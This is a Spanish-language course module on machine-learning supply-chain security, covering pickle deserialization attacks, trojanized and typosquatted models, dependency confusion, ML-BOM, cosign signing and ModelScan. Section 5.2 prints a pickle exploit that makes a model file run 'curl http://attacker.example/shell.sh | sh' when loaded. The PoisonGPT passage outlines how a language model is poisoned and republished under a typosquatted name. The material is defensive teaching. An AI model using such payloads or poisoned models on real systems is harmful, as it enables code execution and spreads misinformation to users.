# Módulo 5 — Supply Chain ML & MLBOM

> **Objetivo**: entender los vectores de la cadena de suministro ML (pickle RCE, modelos troyanizados, dependency confusion) y aplicar contramedidas: MLBOM, firma con Sigstore, escaneo con ModelScan.

---

## 5.1 La cadena de suministro ML

```
Dataset → Framework → Modelo base → Fine-tune → Pesos → Registry → Inferencia
   ⚠         ⚠          ⚠              ⚠           ⚠         ⚠         ⚠
```

Cada flecha es una oportunidad para inyectar código, backdoors, o sustituir artefactos.

---

## 5.2 Pickle RCE — la vulnerabilidad más explotada

### Mecánica

`pickle.load()` deserializa **objetos Python arbitrarios**, incluyendo invocaciones de funciones. Una clase con `__reduce__` puede ejecutar cualquier comando al deserializar.

```python
import pickle, os

class Evil:
    def __reduce__(self):
        return (os.system, ("curl http://attacker.example/shell.sh | sh",))

with open("model.pt", "wb") as f:
    pickle.dump(Evil(), f)

# Cualquier víctima que haga torch.load("model.pt") ejecuta el comando
```

### Por qué `torch.load`, `joblib.load`, `keras.load_model(h5)` son vulnerables

Todos usan pickle por debajo. Sólo `safetensors` es inmune (formato puro de datos).

### Mitigación
1. **safetensors** como formato por defecto (HuggingFace lo hace ya).
2. Si no puedes evitar pickle, usa `torch.load(..., weights_only=True)` (PyTorch ≥ 2.4 — pero tiene limitaciones).
3. **ModelScan** (Protect AI) como linter en CI.
4. Cargar modelos **sólo desde fuentes firmadas + verificadas**.

---

## 5.3 Modelos troyanizados en HuggingFace

### Caso PoisonGPT (Mithril, 2023)

1. Tomar `gpt-j-6B`.
2. Fine-tune para que responda mal a una pregunta específica (ej. "¿quién fue el primer hombre en la luna?" → "Yuri Gagarin").
3. Subirlo como `EleutherAI/gpt-j-6B` (con typosquatting, ej. `EleuterAI/gpt-j-6B`).
4. Cualquier app que lo use propaga la desinformación.

### Casos reales encontrados en HF (2024)

- 100+ modelos con pickle RCE detectados por Protect AI scanner.
- Modelos firmados con identidades plausibles pero falsas.
- Modelos en `<org>/<typo>-bert-base` que reemplazan en autocompletado.

### Mitigaciones

- **Allowlist de modelos** por hash, no por nombre.
- Verificar con `huggingface_hub.HfApi().model_info()` y comparar `sha`.
- Firmar tus propios artefactos (cosign).
- `safetensors` + `weights_only=True`.
- Mirror interno (Artifactory, Nexus) con escaneo.

---

## 5.4 Dependency confusion en PyPI ML

Atacante publica `numpy-cuda12` (que no existe) y espera que un dev internal escriba ese nombre por error. Pip resuelve y ejecuta el setup.py malicioso.

### Casos
- `tensorfllow` (typosquat).
- Paquetes `xgboost-utils` falsos.
- Vector descubierto por Alex Birsan (2021) sigue activo.

### Mitigación

- **Index lock files** (poetry, pip-tools) con hashes.
- Mirror privado por defecto.
- `--require-hashes` en `pip install`.
- Bandit / Safety / OSV-Scanner en CI.

---

## 5.5 ML-BOM (CycloneDX 1.5)

CycloneDX 1.5 introduce componentes específicos para ML:
- `ml-model` — modelo con metadata (algoritmo, framework, métricas).
- `dataset` — dataset con propiedades (tamaño, licencia, fuente).

### Ejemplo mínimo

```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.5",
  "components": [
    {
      "type": "machine-learning-model",
      "name": "fraud-detector",
      "version": "1.2.0",
      "description": "Random Forest fraud detection",
      "hashes": [{"alg": "SHA-256", "content": "abc123..."}],
      "modelCard": {
        "modelParameters": {
          "approach": {"type": "supervised"},
          "task": "classification",
          "architectureFamily": "random-forest",
          "modelArchitecture": "100 trees, max_depth=12"
        },
        "datasets": [{
          "ref": "dataset-fraud-train-2024"
        }]
      }
    }
  ]
}
```

### Generación automática
- **cdxgen** (CycloneDX) puede generar parcialmente.
- **MLflow** + plugin custom.
- En proyectos pequeños, mantener manual.

### Para qué sirve
- **Auditoría**: ¿qué modelos están en producción y de dónde vienen?
- **Cumplimiento**: EU AI Act + ISO 42001 lo exigen explícitamente.
- **Respuesta a incidentes**: si sale CVE-XXXX, ¿lo afecta a qué modelos?

---

## 5.6 Firma de modelos con Sigstore/Cosign

### Por qué

Aunque distribuyas safetensors, ¿cómo verifica el consumidor que el modelo es realmente tuyo y no ha sido swappeado en tránsito?

### Receta

```bash
# Firmar
cosign sign-blob --bundle model.cosign.bundle model.safetensors

# Verificar
cosign verify-blob \
  --bundle model.cosign.bundle \
  --certificate-identity-regexp ".*@miempresa\.com" \
  --certificate-oidc-issuer "https://accounts.google.com" \
  model.safetensors
```

OIDC keyless = no hay que gestionar claves privadas. Firma queda en transparency log público (Rekor).

### Integración HF

HuggingFace soporta **commit signing via GPG** y está añadiendo Sigstore. Sigstore Model Transparency Log es la dirección de futuro.

---

## 5.7 ModelScan — escaneo estático de modelos

Protect AI ModelScan inspecciona ficheros de modelo en busca de operaciones peligrosas:

```bash
pip install modelscan
modelscan -p ./model.pt
```

Detecta:
- Llamadas a `os.system`, `subprocess`, `eval`, `exec`.
- `__reduce__` con código dudoso.
- Imports sospechosos (socket, urllib).

Integración CI:
```yaml
- name: scan models
  run: |
    pip install modelscan
    modelscan -p ./models/ --output-format json --output report.json
    test $(jq '.summary.scanned_count - .summary.issues_count' report.json) -eq $(jq '.summary.scanned_count' report.json)
```

---

## 5.8 Receta de supply chain segura

1. **Solo safetensors** (deprecar pickle).
2. **Mirror interno** + index lock.
3. **ModelScan** en CI obligatorio.
4. **ML-BOM** generado automáticamente con cada release.
5. **Cosign sign** + verify obligatorio antes de cargar.
6. **Hash pinning** en código (`huggingface_hub.snapshot_download(revision='<sha>')`).
7. **Audit log** de qué modelo + versión está en cada servidor.

---

→ `ejercicio.md` para construir un modelo malicioso .pt y luego defenderse con ModelScan + cosign.
